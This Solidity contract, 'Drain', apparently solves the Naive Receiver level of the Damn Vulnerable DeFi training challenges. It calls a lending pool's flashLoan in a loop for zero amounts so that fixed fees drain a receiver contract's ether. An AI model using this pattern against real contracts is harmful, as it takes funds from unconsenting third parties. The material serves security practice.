// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
interface INaive {
    function fixedFee() external pure returns (uint256);
    function flashLoan(address borrower, uint256 borrowAmount) external;
    receive () external payable;
}
/**
 * @title Drain
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Drain {

    function flashLoan(INaive pool, address receiver) external {
        while(receiver.balance >= 1 ether) {
            pool.flashLoan(receiver, 0);
        }
    }

}
